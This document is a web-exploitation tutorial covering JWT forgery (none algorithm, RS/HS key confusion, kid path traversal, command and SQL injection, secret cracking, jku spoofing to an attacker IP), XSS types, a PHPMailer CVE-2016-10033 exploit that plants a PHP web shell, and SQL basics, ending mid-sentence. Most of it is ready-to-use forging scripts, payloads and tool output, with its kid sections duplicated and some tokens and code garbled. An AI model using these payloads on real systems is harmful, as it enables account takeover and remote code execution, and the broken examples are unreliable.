# Learning from the Field: Web Exploitation

## JWT

JSON Web Token (JWT) is an Internet standard for creating data with optional signature and optional encryption. JWTs can be signed using a secret (with the HMAC algorithm) or a **public/private** key pair using **RSA** or **ECDSA**.

### Usage of JWTs

A very common use of a JWT token is as an API **authentication mechanism** as well as **Information Exchange**.

#### Authentication Mechanism

Once the user is logged in, the user can access everything allowed with that token.

#### Information Exchange

JWTs are useful in sharing information because they are signed by public/private keys as well as we can verify the token if it's tampered or not.

### JSON Web Token structure

JWTs cosists of 3 parts seperated by dots.

`header.payload.signature`

#### Header

Header consist of two things: first one is **type of token** and another thing is **signing algorithm** like HMAC SHA256 or RSA.

For Example:

`Base64:    eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0=`

After Decoding:

``` json
{
  "alg": "SH256",
  "typ": "JWT"
} 
```

#### Payload

Payload contains the claims. Claims are statements about the user and additional data about the user.

For Example:

`Base64: eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ==`

After Decoding:

```json
{
    "id": "1",
  "name": "Anas Jamal",
  "admin": true
} 
```

#### Signature

For creating the signature part you have to take the base64 encoded header and payload, a secret, the algorithm specified in the header, and sign that.

For Example:

```js
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
  )
```

#### All 3 Combined

`Header + Payload + Secret`

```js
eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0.eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ.6pqwrq5XQFq3453rtw234fuZ4
```

### Implmenting

Whenever you will recieve a jwt token first decode it and break it into parts like we have learnt in the above section.

`Header + Payload + Secret`

#### Decoding

For decoding you can use:

1. Terminal  
2. [jwt.io](https://jwt.io/)
3. Decoder tab in burp Suite

There are other ways for decoding the token too.

##### Terminal

Linux:

```bash
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -d 
```

Mac OS:

```bash
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -D 
```

Note: Keep in mind in mac os we use "D" instead of  "d".

##### jwt.io

just copy the whole token and paste it into `Encoded` Section and you will get decoded token in `Decoded` Section.

##### Burp Suite Decoder

Copy the whole token and go to burp suite `Decoder` tab and paste it there and select first part and click on `decode` as `base64` and do the same thing with other parts of the token.

**Note** : Don't include dot(`.`) while decoding the token.

#### None Algorithm

`None` Algorithm is used when the integrity of the token has been already verified but hackers can use this algorithm and can tamper the token and can gain unauthorized access.
Let's See How

```js
Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.6pqwrq5XQFq3453rtw234fuZ4
```

#### JWT Token Break Down

1. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (Header)
2. eyJ1c2VyIjoidGVzdCJ9 (Payload)
3. 6pqwrq5XQFq3453rtw234fuZ4 (Secret)

After Decoding:

Header:

```js
{
    "alg":"HS256",
    "typ":"JWT"
}
```

Payload:

```js
{
    "user":"test"
}
```

Now let's change "alg" from `HS256` to `None` and "user" from `test` to `admin`

Header After Changes:

```js
{
    "alg":"None",
    "typ":"JWT"
}
```

Payload After Changes:

```js
{
    "user":"admin"
}
```

Now base64 encode `Header` and `Payload` and send the new token to the web application with empty `secret`.

New Token:

```js
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

For encoding we can use :

1. CyberChef
2. Burp Suite Decoder
3. Your Terminal

For encoding on Terminal just remove `-d` / `-D` let's see an example

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64
```

For sending Requests we can use:

1. Inspect Element > Go to cookies > replace the token with your new token.
2. Burp Suite Intercept or send the requests to repeater and play with the request.

So this is one simple way of hacking JWTs.

### Exploiting JWT

#### CVE-2016-5431 Key Confusion Vulnerability

##### RSA

The `RSA` is asymmetric and in assymetric we have 2 keys

```md
1. Public Keys (for verifying you need a public key coresponding to the private key used for the signature.)

2. Private Keys. (For signing the token you need a private key)
```

Library Function: `verify(clientToken, serverRSAPublicKey)`

##### HMAC

The `HMAC` uses the same secret for signing as well as verifying the token.

Library Function: `verify(clientToken, serverHMACSecretKey)`

##### The Vulnerability

The vulnerability is straight forward, The attacker can change the algorithm from `RS256` to `HS256` that means from RSA to HMAC .

So when you send the tampered cookie the code will call `verify(clientToken, serverHMACSecretKey)` instead of `verify(clientToken, serverRSAPublicKey)` because our token algorithm is `HS256`.

Now Public keys are available publicly and we can forge our new token by changing the algorithm from `RS256` to `HS256` and signing our token with the publicly available key.

##### The Exploitation

We can exploit it in several ways we will mention 3 methods:

1. Manually decoding / encoding and signing.
2. Writing your own script using any scripting language (ruby/python).
3. using [jwt_tool](https://github.com/ticarpi/jwt_tool).

The easiest way is using [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

1. clone the tool and install all dependencies.
2. Download the public key in the same directory.
3. Run the tool

Syntax : `./jwt_tool.py <paste your token>`

```py
./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImFuYXMifQ.abcWIUU4HvocTw1aiP44hjawkr5CUTTjRAb0QCb00l82vJjjs5Nuilm10eQMkGGlleH_99MSMgZZ8xlZksOtVWmcXXflAOm0pLiDhol_Fpnak-BMSUmc9CjtJvFy_0qkmKz8T4QWZ7gG2XjRGcsueNKS-Hx9ExGDlLAGsdmiwMiLzuNeO7iW7ECG9nUrNMpArL3s9cMi-NBiSQQd3DkJLNPZzk2J0Ew-aM3Z744uBH38oNKl4n2ktr4baQMxMIe7pecNLzGgQnZ9UPt-kgzqzPActSK0H4CLhJAekNv3QgOhtJxfeF3e9bMkVx8E4rhTnX4gTqfeu1CX-r1VCtaLdQ

```

##### OUTPUT

after running choose option 1 for tampering with the token.

```md
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = RS256

Token payload values:
[+] login = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

```

After choosing `1` choose `0` and press `1` and change `<your username>` to `admin` in this case from `anas` to `admin`.

```md
====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = RS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] login = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of login is: demo
Please enter new value and hit ENTER
> admin
[1] login = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step
```

press `0`

Now the last Step:
The vulnerability here is `Sign with HS/RSA key confusion vulnerability` choose `4` and type the name of public key file name in this case our public key file name is `public.key` and hit `Enter` and if everything goes well we will get our new forged token.

```md
Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 4

Please enter the Public Key filename:
> public.key

====================================================================
This option takes an available Public Key (the SSL certificate from 
a webserver, for example?) and switches the RSA-signed 
(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.
====================================================================
File loaded: public.key

Set this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).
(This will only be valid on unpatched implementations of JWT.)

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.CN6XRx3X4MavzJW0pYNJWJzt0xdSLwnGRX6uHr35qGA

```

Now just send the forged cookie to the site using curl, burp suite, or simply using inspect element.
Finally we will get admin access :)

#### Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature.
You can try exploit them if they are not properly sanitized.

### Multiple types of vulnerabilities in kid

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

### Local File Inclusion

Let's Take an Example :

#### Token

```js
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:

```js
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```

Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```js
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```

After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby.

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple.

`OpenSSL::HMAC.hexdigest("SHA256", key, data)`

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```js
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`.

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`.

#### Command Injection

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```js
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token

`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```js
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

### Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature.
You can try exploit them if they are not properly sanitized.

#### Multiple types of vulnerabilities in kid

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

#### Local File Inclusion

Let's Take an Example :

#### Token

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:

```json
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```

Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```json
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```

After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby.

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple.

`OpenSSL::HMAC.hexdigest("SHA256", key, data)`

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```ruby
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`.

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`.

### Command Injection in KID

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```bash
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token

`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```bash
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

### SQLi in KID

SQLi in KID is very similar to `Command Injection` and `Local File Inclusion` because `KID` can also retrieve key from the databse.

let's see an example :

```json
{
"alg" : "HS256",
"typ" : "JWT",
"kid" : "1"
}
```

If SQLi is possible in KID we can forge our own `root` account token using a simple ruby / python script or manually.

#### Ruby Script

```ruby

require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "keynotpresent\' UNION SELECT \'newkey"}'
payload = '{"user": "root"}'

header_payload = Base64.strict_encode64(header)+"."+ Base64.strict_encode64(payload)
header_payload.gsub!("=","")

secret = "newkey"

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, header_payload))

token = header_payload+"."+signature
puts token
```

#### Explaination

The script imports `base64` and `openssl` modules and the real trick is in `header` the payload forces application to sign the token with key value `newkey` because `keynotpresent` does not exist in the database so it will use `newkey` as it's secret and sign it and we know that secret so we can forge our token easily and sign them.

#### Token After Running the Script

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogImtleW5vdHByZXNlbnQnIFVOSU9OIFNFTEVDVCAnbmV3a2V5In0.eyJ1c2VyIjogInJvb3QifQ.zRLDqEZ1tQC8atcO7bjvHaSTTpEefORDyqgFUnZH4Ok`

### Cracking JWTs Secret

Sometimes developers use common terms as a token secret.
If that's the case we can crack them easily. We can use [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

First let's Prepare a wordlist:

```bash
password
Password123
admin
root
hackingbible
```

you can also use `rockyou.txt` or there are lots of wordlists present on the internet.

```bash
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjphbmFzfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 7
Please provide filename for dictionary file.

> wordlist.txt

Loading key dictionary...
File loaded: wordlist.txt
Testing passwords in dictionary...

[+] hackingbible is the CORRECT key!
```

If we got lucky we can get the Correct key. Now after cracking the secret we can just forge the token.

```bash
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjphbmFzfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = HS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] user = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of user is: None
Please enter new value and hit ENTER
> admin
[1] user = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 1

Please enter the known key:
> hackingbible

Please enter the keylength:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc
[+] Standard: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc+N077EOEhFVJdvA7ufgp8qb+fLLUkIyqZc

```

Voila!! we got our admin token, now just use inspect element or burp suite repeater and refresh you will get admin session.

### Vulnerabilities in JKU

jku or JWK Key URL is an URI that reference the public key used for generating the signature. It must follow RFC7517 format. The entity verifying the token is responsible for checking whether that signing key can be trusted or not.

The Vulenerability is pretty simple. 

#### Token

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vdHJ1c3RlZHNpdGUuY29tL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYW5hcyJ9.XivlD0Q5Sa6rpWVDNNkaZNjQfLSa9YmkUsZZ77gbcIQD-0iZ_e6vZw_N-sSZuS3s6XV8AYviXcNDv1nTpyplVY1VFnrp5Vv4J2r-w4yeeCAV87lIQ88vCpHuHep3lTYpC7Gbl3ysIuf8BfrzBm-T-C2rOQ_knlWlkSUODP106Mj5_N4gKHDW4fkTKb3i412O7HB3XCsDx6-_oMPVazof0TRs8isN8b3_Jv3YXUHtseGjsBNxO9GELUUU19VCS86EC2fm1OKdl8Ih7TIKS5CW7tyVreVAo6Vp8Th0Te380CHmz1ejTJHF19RARhiU9srusKwca2hK9JiDOOSnAB-vTA
```

After Decoding the first part 
```
{
  "typ":"JWT",
  "alg":"RS256",
  "jku":"https://trustedsite.com/jwks.json"
}
```

jku header will verify the token from `https://trustedsite.com/jwks.json` in this attack we will write a simple ruby script.

First lets download keys from `https://trustedsite.com/jwks.json`.

```
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "hackingbible",
      "n": "odatTataxcajr3hK3opCF5uqKWKbm4KkqIiDJSEsQ4PnAz14P_aJnfnsQwgchFGN95cfCO7euC8HjT-u5WHHDn08GQ7ot6Gq6j-fbwMdRWjLC74XqQ0JNDHRJoM4bbj4i8FaBdYKvKmnJ8eSeEjA0YrG8KuTOPbLsglADUubNw9kggRIvdahshdapfaihfp457QVVFaIllZpMITtocuPkOKd8bHzkZzKN4HJtM0hgzOjeyCfqZxh1V8LybliWDXYivUqmvrzchzwXTAQPJBBfYo9BO6D4Neui8rGbc49OBCnHLCWtPH7m7xp3cz-PbVnLhRczzsQE_3escvTF0FGw",
      "e": "AQAB",
      "alg": "RS256"
    }
  ]
}
```

Now our job is to generate our own private key and extract `n` and `e` from the public and replace it with the above values of `n` and `e`.

Now lets generate `private.pem`

`openssl genrsa -out private.pem 2048`

Now we are ready to write our script.

#### Ruby Script

```
require 'base64'
require 'json'
require 'openssl'
header = {"typ":"JWT","alg":"RS256","jku":"http://13.232.172.41/newkeys.json"}
payload = {"user":"root"}
token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/, "")+"."
token+= Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/, "")
priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/, "")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/, "")
puts n
puts e
sign = priv.sign("SHA256", token)
puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/, "")
```

#### Explanation

After running the script we will recieve values of `n` and `e` replace them with the previous values of `n` and `e` as mentioned above.
In the above script we are just replacing default jku header value to our malicious server address on which we are hosting our tampered key file.


`priv = OpenSSL::PKey::RSA.new File.read 'private.pem'` 

this line used for reading the `private.pem` file. 

`pub = priv.public_key` 

used for extracting public key

`n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/, "")`
used for extracting value of `n` from public key.

`e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/, "")`
used for extracting value of `e` from public key.

after executing the script we will get the token just replace it with current token using inspect element and we will get the the `root` account ;)

## XSS

Cross-Site Scripting (XSS) attacks are a type of injection.Using This You can inject malicious payload in to the website.

### Type Of XSS

#### Reflected XSS

It occurs when an application receives data in an HTTP request and includes that data within the response

```html
   http://example.com/data?username=Data+Example

   <h2> Username : Data Example </h2>
````

It can not perform any other processing in data so that we can inject our payload easyly.

```html
   http://example.com/data?username=<script>/* Your Payload */ </script>

   <h2> Username : <script>  /* Your Payload */ </script>
```

##### Impact of Reflected XSS

* It Perform any action that user can perform in website.
* View and modify any information that user can do

#### Stored XSS

Its occurs when an application receives data from an untrusted source and includes that data within its later HTTP responses

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=temp+feedback

  <p>temp feedback </p>
```

It can not perform any other processing in data so that we can inject our payload easyly.
here we use encoded url.

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=%3Cscript%3E%20%20%2F*%20Your%20Payload%20*%2F%20%3C%2Fscript%3E

  <p><script>  /* Your Payload */ </script></p>
```

When its execute in website now it is permanently added in that website and any user can view that

##### Impact of Stored XSS

* Attackers can change any parameters and write anything in the website source code
* Attackers can easyly execute that malicious code in website
* The key difference between reflected and stored XSS is that stored XSS vulnerabilities are contained within the application and the attacker does not need to induce the target to click on a specific link with their exploit.

#### DOM (Document Object Model) XSS

Its occurs when an application contains some client-side JavaScript that processes data from an untrusted source, usually by writing the data back to the DOM.

```html
var search = document.getElementById('username').value;
var results = document.getElementById('results');
results.innerHTML = 'Your username is : ' + username;

```

Hear attacker can control the value of input field so that they can create their own malicious payload and execute it

```html
 Your username is : <img src=1 onerror='/* Your Payload */'>
```

##### Impact of DOM XSS

* Account Hijacking : Attackers often steal session cookies in the browser to hijack user accounts.
* Credential Theft  : Attackers can clone the page and sent that page to victim and victim use credentials and its forward to attacker.
* Data Leakage : attacker has access to the personal or sensitive information of users

## PHPMailer CVE-2016-10033

This bug is very interesting and very easy to exploit. Let's breakdown the basic Functionality of PHPMailer.

```steps
 1) PHPMailer gets user requests
 
 2) PHPMailer validates the user supplied information
 
 3) PHPMailer sends the information to the PHP mail() function to send the email.
```

### Bug

The problem here is PHPMailer does not clean the user supplied email values before sending it to the PHP mail() function. it basically returns `$result` and pass it to mail() function.

### Exploitation

The exploitation is simple

`"malicious@127.0.0.1\" -oQ/tmp/ -X/var/www/malicious.php  root"@127.0.0.1`

Pass this into `FROM` field and your PHP code into mail body.

```malicious
<?php system$(_GET["command"]); ?>
```

intercept the request and edit the request in it and forward it or you can just simply change type from `mail` to `text` and send.

So in the above code we are basically creating a file `malicious.php` and the code of that file is in `body` of the mail.

now just visit :
`https://vulnerablesite.com/malicious.php?command=whaomi`

and we got rce easily through this vulnerability in PHPMailer also you can get reverse shell using this method.

## SQL Injection

In this we will discuss about SQL Injections let's first see a simple definition of SQL.
SQL is `Structured Query Language`, which is a computer language for storing, manipulating and retrieving data stored in a database.

Now let's understand SQL Injection. Basically SQL injections are web security vulnerabilities that are very dangerous and allows an attacker to alter the logic of the query and the attack can lead to data theft, website defacement (changing the content of website), sometimes it can allow an attacker to delete or modify the data inside the data. So from this you can now imagine how dangerous SQL injection is.

### Let's Clear Some Basics First

First we have to know types of queries in SQL:

* SELECT : It is used to select data from the database.

  Syntax:

  ```syntax
   SELECT column1, column2, ...
   FROM table_name;

  ```
  
* INSERT : adding new rows to a table.

  Syntax:

  ```syntax
   INSERT INTO table_name (column1, column2, column3, ...)
   VALUES (value1, value2, value3, ...);  

  ```

* UPDATE: It is used to update any record of data in a table.

Syntax:

  ```syntax
   UPDATE table_name
   SET column1 = value1, column2 = value2, ...
   WHERE condition;  
```

* DELETE: Removing rows from a table

```syntax
   DELETE FROM table_name WHERE condition;
```

* Stored Procedures : MSSQL procedures xp_cmdshell which can be used for executing commands on the remote database host.

Now let's see how to make comments in SQL.
we can make comments using two hyphens.

`--`

the query after `--` will be ignored and that's very useful in sql injection.

Let's take an example :

